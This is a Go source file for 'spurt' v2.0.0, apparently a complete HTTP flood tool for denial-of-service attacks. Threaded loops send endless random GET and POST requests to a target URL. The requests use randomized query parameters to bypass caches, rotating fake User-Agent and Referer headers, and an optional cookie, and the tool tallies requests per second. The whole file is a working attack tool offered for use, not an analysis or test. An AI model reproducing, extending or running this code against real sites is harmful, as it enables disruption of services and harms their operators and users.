package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/buptmiao/parallel"
	"github.com/zer-far/roulette"
)

var (
	version = "v2.0.0"

	banner = fmt.Sprintf(`
                          __
   _________  __  _______/ /_
  / ___/ __ \/ / / / ___/ __/
 (__  ) /_/ / /_/ / /  / /_
/____/ .___/\__,_/_/   \__/
    /_/                      ` + version)

	reset  = "\033[0m"
	red    = "\033[31m"
	green  = "\033[32m"
	blue   = "\033[34m"
	cyan   = "\033[36m"
	yellow = "\033[33m"
	clear  = "\033[2K\r"

	target          string
	paramJoiner     string
	reqCount        uint64
	successCount    uint64
	failureCount    uint64
	threads         int
	timeout         int
	timeoutDuration time.Duration
	sleep           int
	sleepDuration   time.Duration
	cookie          string
	useCookie       bool
	c               *http.Client
	wg              sync.WaitGroup
)

func colourise(colour, s string) string {
	return colour + s + reset
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}

func isValidURL(inputURL string) bool {
	_, err := url.ParseRequestURI(inputURL)
	if err != nil {
		fmt.Println("Error parsing URL:", err)
		return false
	}

	u, err := url.Parse(inputURL)
	if err != nil || u.Scheme == "" {
		fmt.Println("Invalid URL scheme:", u.Scheme)
		return false
	}

	if !strings.HasPrefix(u.Scheme, "http") {
		fmt.Println("Unsupported URL scheme:", u.Scheme)
		return false
	}

	resp, err := http.Get(inputURL)
	if err != nil {
		fmt.Println("Error making request:", err)
		return false
	}
	defer resp.Body.Close()

	return true
}

func createHttpClient() *http.Client {
	tr := &http.Transport{
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     90 * time.Second,
	}
	return &http.Client{
		Transport: tr,
		Timeout:   timeoutDuration,
	}
}

func get() {
	start := time.Now()
	req, err := http.NewRequest("GET", target+paramJoiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
	if err != nil {
		fmt.Println(err)
	}

	req.Header.Set("User-Agent", roulette.GetUserAgent())
	req.Header.Add("Cache-Control", "no-cache")
	req.Header.Set("Referer", roulette.GetReferrer()+"?q="+buildblock(rand.Intn(5)+5))
	req.Header.Set("Keep-Alive", fmt.Sprintf("%d", rand.Intn(10)+100))
	req.Header.Set("Connection", "keep-alive")

	if useCookie {
		req.Header.Set("Cookie", cookie)
	}

	resp, err := c.Do(req)

	atomic.AddUint64(&reqCount, 1)
	elapsed := time.Since(start)

	if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
		fmt.Print(colourise(red, clear+"Status: Timeout"))
		atomic.AddUint64(&failureCount, 1)
	} else if err != nil {
		fmt.Printf(colourise(red, clear+"Error: %s"), err)
		atomic.AddUint64(&failureCount, 1)
	} else {
		atomic.AddUint64(&successCount, 1)
		fmt.Printf(colourise(green, clear+"Status: OK, Time: %v\n"), elapsed)
		resp.Body.Close()
	}
}

func post() {
	start := time.Now()
	payload := strings.NewReader("data=" + buildblock(rand.Intn(50)+10))
	req, err := http.NewRequest("POST", target, payload)
	if err != nil {
		fmt.Println(err)
	}

	req.Header.Set("User-Agent", roulette.GetUserAgent())
	req.Header.Add("Cache-Control", "no-cache")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := c.Do(req)

	atomic.AddUint64(&reqCount, 1)
	elapsed := time.Since(start)

	if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
		fmt.Print(colourise(red, clear+"Status: Timeout"))
		atomic.AddUint64(&failureCount, 1)
	} else if err != nil {
		fmt.Printf(colourise(red, clear+"Error: %s"), err)
		atomic.AddUint64(&failureCount, 1)
	} else {
		atomic.AddUint64(&successCount, 1)
		fmt.Printf(colourise(green, clear+"Status: OK (POST), Time: %v\n"), elapsed)
		resp.Body.Close()
	}
}

func loop() {
	for {
		// Randomize between GET and POST
		if rand.Intn(2) == 0 {
			go get()
		} else {
			go post()
		}
		time.Sleep(sleepDuration)
	}
}

func main() {
	fmt.Println(colourise(cyan, banner))
	fmt.Println(colourise(cyan, "\n\t\tgithub.com/royzxje\n"))

	flag.StringVar(&target, "url", "", "URL to target.")
	flag.IntVar(&timeout, "timeout", 3000, "Timeout in milliseconds.")
	flag.IntVar(&sleep, "sleep", 1, "Sleep time in milliseconds.")
	flag.IntVar(&threads, "threads", 1, "Number of threads.")
	flag.StringVar(&cookie, "cookie", "", "Cookie to use for requests.")
	flag.Parse()

	if !isValidURL(target) {
		os.Exit(1)
	}
	if timeout == 0 {
		fmt.Println("Timeout must be greater than 0.")
		os.Exit(1)
	}
	if sleep <= 0 {
		fmt.Println("Sleep time must be greater than 0.")
		os.Exit(1)
	}
	if threads == 0 {
		fmt.Println("Number of threads must be greater than 0.")
		os.Exit(1)
	}

	if cookie != "" {
		useCookie = true
	}

	timeoutDuration = time.Duration(timeout) * time.Millisecond
	sleepDuration = time.Duration(sleep) * time.Millisecond
	c = createHttpClient()

	if strings.ContainsRune(target, '?') {
		paramJoiner = "&"
	} else {
		paramJoiner = "?"
	}

	fmt.Printf(colourise(blue, "URL: %s\nTimeout (ms): %d\nSleep (ms): %d\nThreads: %d\n"), target, timeout, sleep, threads)

	fmt.Println(colourise(yellow, "Press control+c to stop"))
	time.Sleep(2 * time.Second)

	start := time.Now()

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		elapsed := time.Since(start).Seconds()
		rps := float64(reqCount) / elapsed
		successRate := float64(successCount) / float64(reqCount) * 100
		fmt.Printf(colourise(blue, "\nTotal time (s): %.2f\nRequests: %d\nRequests per second: %.2f\nSuccess rate: %.2f%%\n"), elapsed, reqCount, rps, successRate)

		os.Exit(0)
	}()

	p := parallel.NewParallel()
	for i := 0; i < threads; i++ {
		p.Register(loop)
	}
	p.Run()
}
